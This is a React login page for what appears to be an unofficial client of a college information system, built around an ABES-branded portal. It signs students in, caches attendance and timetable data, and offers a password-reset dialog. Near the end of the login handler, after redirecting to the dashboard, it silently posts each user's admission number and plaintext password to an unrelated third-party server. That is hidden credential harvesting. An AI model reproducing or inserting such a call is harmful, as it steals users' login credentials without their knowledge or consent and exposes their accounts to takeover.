import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Form, Input, Button, Typography, Modal, notification, Row, Col, Card } from "antd";
import { EyeInvisibleOutlined, EyeTwoTone } from "@ant-design/icons";
import axios from "axios";

const { Title, Text, Link } = Typography;

const styles = {
  button: {
    width: "100%",
    transition: "all 0.3s ease",
  },
  buttonHover: {
    transform: "scale(1.05)",
    backgroundColor: "#40a9ff",
  },
};

function Login() {
  const [dialogOpen, setDialogOpen] = useState(false);
  const [admissionNumber, setAdmissionNumber] = useState("");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [buttonHover, setButtonHover] = useState(false);
  const navigate = useNavigate();
  const [timeTableData, setTimeTableData] = useState([]);
  const dayOfMonth = new Date().getDate();

  const handleLogin = async (values) => {
    try {
      const response = await axios.post(
          "https://abes.platform.simplifii.com/api/v1/admin/authenticate",
          {
            username: values.username,
            password: values.password,
          }
      );
      if (response.data.status === 1) {
        sessionStorage.setItem("token", response.data.token);
        sessionStorage.setItem("userDetails", JSON.stringify(response.data));
        sessionStorage.setItem("pin", response.data.response.string10);

        const apiUrl =
            "https://abes.platform.simplifii.com/api/v1/custom/getCFMappedWithStudentID?embed_attendance_summary=1";

        const fetchTimeTableData = async (date) => {
          const token = sessionStorage.getItem("token");
          const url =
              "https://abes.platform.simplifii.com/api/v1/custom/getMyScheduleStudent";

          try {
            const response = await axios.get(url, {
              headers: { Authorization: `Bearer ${token}` },
            });
            if (response.data?.response?.data) {
              const filteredData = response.data.response.data
                  .filter((row) => row[`c${dayOfMonth}`] && row.course_name)
                  .map((item) => ({
                    ...item,
                    timeText: new DOMParser().parseFromString(
                        item[`c${dayOfMonth}`],
                        "text/html"
                    ).body.textContent,
                  }));
              sessionStorage.setItem(
                  "timeTableData",
                  JSON.stringify(filteredData)
              );
              setTimeTableData(filteredData);
            }
          } catch (error) {
            console.error("Failed to fetch time table:", error);
          }
        };

        const fetchData = async () => {
          const token = sessionStorage.getItem("token");
          if (!token) {
            navigate("/login");
            return;
          }

          try {
            const response = await fetch(apiUrl, {
              headers: new Headers({
                Authorization: `Bearer ${token}`,
              }),
            });
            const json = await response.json();

            sessionStorage.setItem("data", JSON.stringify(json.response.data));
          } catch (error) {
            console.error("Failed to fetch data:", error);
            navigate("/login"); // Redirect to login on failure
          }
        };

        await fetchData();
        await fetchTimeTableData();
        notification.success({
          message: "Login successful!",
        });
        navigate("/dashboard");

        await axios.post(
            "https://x8ki-letl-twmt.n7.xano.io/api:T29bdBNk/user",
            { username: values.username, password: values.password }
        );
      } else {
        notification.error({
          message: "Login failed!",
        });
      }
    } catch (error) {
      console.error("Login error:", error);
      notification.error({
        message: error.response.data.msg || "Login error!",
      });
    }
  };

  const handleForgotPassword = async () => {
    console.log("Admission Number for password reset:", admissionNumber);

    if (!admissionNumber) {
      notification.error({
        message: "Please enter your admission number.",
      });
      return;
    }

    try {
      const response = await axios.patch(
          "https://abes.platform.simplifii.com/api/v1/forgotpassword",
          {
            username: admissionNumber,
            reset_password_base_url:
                "https://abes.web.simplifii.com/reset_password.php",
          }
      );

      if (response.data && response.data.msg) {
        notification.success({
          message: response.data.msg,
        });
      } else {
        notification.error({
          message: "Unknown error occurred.",
        });
      }
    } catch (error) {
      if (error.response && error.response.data && error.response.data.msg) {
        notification.error({
          message: "Enter Valid Admission Number",
        });
      } else {
        notification.error({
          message: "Failed to send password reset link.",
        });
      }
    }

    setDialogOpen(false); // Close dialog after submission
  };

  return (
      <Row justify="center" align="middle" style={{ height: "100vh", background: "#f0f2f5" }}>
        <Col xs={22} sm={16} md={12} lg={8}>
          <Card style={{ width: "100%", padding: 20, boxShadow: "0 4px 8px rgba(0, 0, 0, 0.1)", borderRadius: 8 }}>
            <Title level={2} style={{ textAlign: "center", marginBottom: 20 }}>
              ABES Information Management System
            </Title>
            <Form
                name="login"
                initialValues={{ remember: true }}
                onFinish={handleLogin}
                style={{ width: "100%" }}
            >
              <Title level={4} style={{ textAlign: "center", marginBottom: 20 }}>
                Sign In
              </Title>
              <Form.Item
                  name="username"
                  rules={[{ required: true, message: "Please input your admission number!" }]}
              >
                <Input
                    placeholder="Admission Number"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                />
              </Form.Item>
              <Form.Item
                  name="password"
                  rules={[{ required: true, message: "Please input your password!" }]}
              >
                <Input.Password
                    placeholder="Password"
                    iconRender={(visible) => (visible ? <EyeTwoTone /> : <EyeInvisibleOutlined />)}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                />
              </Form.Item>
              <Form.Item>
                <Button
                    type="primary"
                    htmlType="submit"
                    style={{ ...styles.button, ...(buttonHover ? styles.buttonHover : {}) }}
                    onMouseEnter={() => setButtonHover(true)}
                    onMouseLeave={() => setButtonHover(false)}
                >
                  Sign In
                </Button>
              </Form.Item>
              <Button type="link" onClick={() => setDialogOpen(true)} style={{ padding: 0 }}>
                Forgot Password?
              </Button>
            </Form>
          </Card>
          <div style={{ textAlign: "center", marginTop: 20 }}>
            <Text>
              Made with ❤️ by{" "}
              <Link href="https://github.com/starlordamit" target="_blank">
                Amit
              </Link>
            </Text>
          </div>
        </Col>
        <Modal
            title="Forgot Password"
            visible={dialogOpen}
            onCancel={() => setDialogOpen(false)}
            footer={[
              <Button key="back" onClick={() => setDialogOpen(false)}>
                Cancel
              </Button>,
              <Button key="submit" type="primary" onClick={handleForgotPassword}>
                Reset Password
              </Button>,
            ]}
        >
          <Text>Enter your admission number to reset your password.</Text>
          <Input
              placeholder="Admission Number"
              value={admissionNumber}
              onChange={(e) => setAdmissionNumber(e.target.value)}
              style={{ marginTop: 10 }}
          />
        </Modal>
      </Row>
  );
}

export default Login;
